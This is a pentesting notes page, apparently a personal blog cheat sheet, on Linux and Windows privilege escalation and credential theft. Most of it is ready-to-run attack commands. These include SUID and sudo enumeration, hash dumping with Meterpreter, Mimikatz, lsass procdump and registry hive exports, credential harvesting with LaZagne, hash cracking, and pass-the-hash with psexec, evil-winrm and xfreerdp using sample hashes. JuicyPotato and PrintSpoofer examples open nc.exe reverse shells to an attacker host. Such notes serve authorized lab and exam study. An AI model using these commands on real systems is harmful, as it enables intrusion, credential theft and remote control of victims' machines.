---
title: Pentesting - Privilege Escalation
author: ioritz_elisa 
date: 2023-07-29 0:0:00 +0000 
categories: [Notes, Pentesting, Privilege Escalation] 
tags: [GTFObins, PEAS, Metasploit, Dumping Hashes, MSG, EML, Mimikatz, Pass The Hash, SAM]
pin: false
---


## Interesting commands

Displays the user and group identity associated with the current user, providing information such as user ID (UID), group ID (GID), and supplementary group memberships:

```
id
```

Displays a list of previously executed commands in the terminal session:

```
history
```

Allows a user with administrative privileges to switch to the root user, effectively gaining superuser (root) access:

```
sudo su
```

To check execution permissions as sudo:

```
sudo -l
```

To find SUID:

```
find . -perm /4000
```

other way:

```
find / -perm -u=s -type f 2>/dev/null
```

Find writteable files:

```
find / -writable -type d 2>/dev/null
```

Applications which have active connections:

```
netstat -tulpn
```

Services running as root:

```
ps aux | grep root
```

Kernel version running

```
uname -a
```



## Interesting Tools

### GTFObins

This page contains a list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems:

* [GTFObins](https://gtfobins.github.io/)

GTFOBins is a community-driven project that provides a curated list of Unix/Linux commands and binaries that can be used for privilege escalation, bypassing security restrictions, or performing other useful operations. Before using any information from GTFOBins, it is essential to check for the specific user's GUIDS to ensure the command is applicable and safe in the given context.


### PEAS (Windows and Linux) - LinPEAS and WinPEAS

* https://github.com/carlospolop/PEASS-ng


### Metasploit - Exploit suggester

```
msf> use post/multi/recon/local_exploit_suggester
```


### Migrate to process with root privileges (in Meterpreter session):

```
meterpreter > steal_token <ID-process>
```


### Dumping hashes in Meterpreter session:

```
msf > load kiwi
```

```shell-session
meterpreter > hashdump
```

```shell-session
meterpreter > lsa_dump_sam
```

```shell-session
meterpreter > lsa_dump_secrets
```


### Bash privilege escalation

```
sudo -u#-1 /bin/bash
```



## Windows

### Windows enumeration

```
net config Workstation

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
   
hostname
   
net users

ipconfig /all
   
route print

systeminfo
  
arp -A
  
netstat -ano
   
netsh firewall show state
   
netsh firewall show config
   
schtasks /query /fo LIST /v
   
tasklist /SVC
   
net start
 
DRIVERQUERY
   
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
   
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
   
dir /s _pass_ == _cred_ == _vnc_ == _.config_
   
findstr /si password *.xml *.ini *.txt
   
reg query HKLM /f password /t REG_SZ /s
   
reg query HKCU /f password /t REG_SZ /s
```

In windows the 'type' command is used instead of 'cat' to view the contents of a file.

Logged-In Users

```
query user
```

Currrent user

```
echo %USERNAME%
```

Current User Privileges

```
whoami /priv
```

Current User Group Information

```
whoami /groups
```

Get All Users

```
net user
```

Get All Groups

```
net localgroup
```

Get Password Policy & Other Account Information

```
net accounts
```

Check Process/Application Is Using a Particular Port on Windows

```
netstat -aon | findstr <port>
```

See the PID of the service and later search it executing "tasklist /svc".


### Windows privesc

[OSCP-notes](https://notchxor.github.io/oscp-notes/4-win-privesc/1-initial/)

[Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)


### MSF - Dumping Hashes (NTLM password hash)

```
meterpreter > lsa_dump_sam
```


### Interesting tools

* PsExec
* Mimikatz


### Privilege escalation - SeImpersonate 
 
* With JuicyPotato:

First, authenticate with a user in MSSQL:

```
mssqlclient.py <user>@<IP> -windows-auth
```

Enabling xp_cmdshell:

```
enable_xp_cmdshell
```

Confirm that it works:

```
xp_cmdshell whoami /priv
```

Escalating Privileges Using JuicyPotato, example:

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

In attacker's machine:

```
sudo nc -lnvp 8443
```


* With PrintSpoofer:

Example:

```shell-session
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

In attacker's machine:

```
sudo nc -lnvp 8443
```


### Privilege escalation - SeDebugPrivilege

Example:

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

This is successful, and we can load this in `Mimikatz` using the `sekurlsa::minidump` command. After issuing the `sekurlsa::logonPasswords` commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).


### Credential Hunting in Windows

The tool [Lazagne](https://github.com/AlessandroZ/LaZagne) is used for discover credentials that web browsers or other installed applications may insecurely store. 

```
start lazagne.exe all
```


### Find patterns with findstr

Example:

```
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```


### Attacking SAM and LSASS

* Using reg.exe to Copy Registry:

```
reg.exe save hklm\sam C:\sam.save

reg.exe save hklm\system C:\system.save

reg.exe save hklm\security C:\security.save
```

Then, these files must be transferred to the attacker's system.

* Dumping Hashes with Impacket's secretsdump.py
Example:

```
python3 /<path>/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Then, the NTLM hashes must be cracked, with John or Hashcat.

```
sudo hashcat -m 1000 <fileHash> <pathWordlist>
```

or:

```
john hash --format=NT --wordlist=<pathWordlist>
```

* Dumping LSA Secrets Remotely

```
crackmapexec smb <victim-IP> --local-auth -u <user> -p <password> --lsa
```

* Dumping SAM Remotely

```
crackmapexec smb <victim-IP> --local-auth -u <user> -p <password> --sam
```

* Obtain LSA from Task Manager

Run Task Manager > search Local Security Authority Process > press right mouse button > create dump file, and then it can be analyze with tools, for example mimikatz or similar.


### Tools for Analysis Windows Files

> MSG and EML files

[Free Online .MSG and .EML Viewer](https://www.encryptomatic.com/viewer/)

> EVTX file

Download: https://github.com/omerbenamram/evtx

```
sudo apt install cargo
```

```
cargo install evtx
```

Convert the evtx file in json file:

```
/root/.cargo/bin/evtx_dump -f <output> -o json <file.evtx>
```


### Pass The Hash (PtH)

#### Interesting Tools

> Mimikatz

Obtaining Hashes:

```
mimikatz # privilege::debug 
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
```

Obtaining SAM:

```
privilege::debug  
token::elevate  
lsadump::sam
```

Pass the hash:

```
mimikatz # privilege::debug 
mimikatz # token::elevate
mimikatz # sekurlsa::pth /user:<username> /ntlm:<hash>
```


### Dump Memory 

#### Interesting Tools

> LaZagne

```
lazagne.exe all
```

Download: https://github.com/AlessandroZ/LaZagne/releases



## Linux

### Pass The Hash (PtH)

#### Interesting Tools

> Impacket PsExec

Syntax:

```
impacket-psexec <username>@<IP> -hashes :<hash>
```

Example:

```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

> CrackMapExec

Syntax:

```
crackmapexec <protocol> <IP> -u <username> -d <domain> -H <hash>
```

Example:

```
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

> Evil-winrm

Syntax:

```
evil-winrm -i <IP> -u <username> -H <hash>
```

Example:

```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

> RDP

Add the registry:

```
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Syntax:

```
xfreerdp  /v:<IP> /u:<username> /pth:<hash>
```

Example:

```
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```


### Dump Memory 

#### Interesting Tools

> LaZagne

```
python2.7 laZagne.py all
```

